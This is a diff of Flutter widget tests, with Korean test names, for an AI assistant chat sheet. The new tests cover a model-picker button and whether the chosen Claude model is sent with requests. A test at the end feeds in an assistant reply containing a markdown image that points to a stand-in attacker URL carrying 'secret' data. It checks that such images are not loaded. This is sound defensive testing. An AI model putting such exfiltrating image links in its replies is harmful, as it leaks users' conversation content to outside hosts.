@@ -68,6 +68,27 @@ void main() {
     expect(find.textContaining('플랫폼', findRichText: true), findsOneWidget);
   });
 
+  testWidgets('모델 — 선택지가 둘 이상이면 머리에 고르는 단추, 고르면 그 모델로 보낸다', (tester) async {
+    final brain = ChatBrain([say('네')])..config = {'enabled': true, 'models': ['claude-sonnet-5-5', 'claude-opus-5-5'], 'defaultModel': 'claude-sonnet-5-5'};
+    await tester.pumpWidget(host(brain, const AssistantSheet()));
+    await tester.pumpAndSettle();
+    await tester.tap(find.byTooltip('모델 고르기'));
+    await tester.pumpAndSettle();
+    await tester.tap(find.text('Opus 5.5').last);
+    await tester.pumpAndSettle();
+    expect(find.text('Opus 5.5'), findsOneWidget);
+    await tester.enterText(find.byType(TextField), '안녕');
+    await tester.tap(find.byTooltip('보내기'));
+    await tester.pumpAndSettle();
+    expect(brain.bodies.last['model'], 'claude-opus-5-5');
+  });
+
+  testWidgets('모델 — 선택지가 하나면 단추를 숨긴다', (tester) async {
+    await tester.pumpWidget(host(ChatBrain([]), const AssistantSheet()));
+    await tester.pumpAndSettle();
+    expect(find.byTooltip('모델 고르기'), findsNothing);
+  });
+
   testWidgets('마크다운 이미지는 불러오지 않는다(외부 주소로 대화 내용이 새는 경로) — 대체 글만', (tester) async {
     final brain = ChatBrain([say('요약 ![로고](https://evil.test/p?d=secret) 끝')]);
     await tester.pumpWidget(host(brain, const AssistantSheet()));
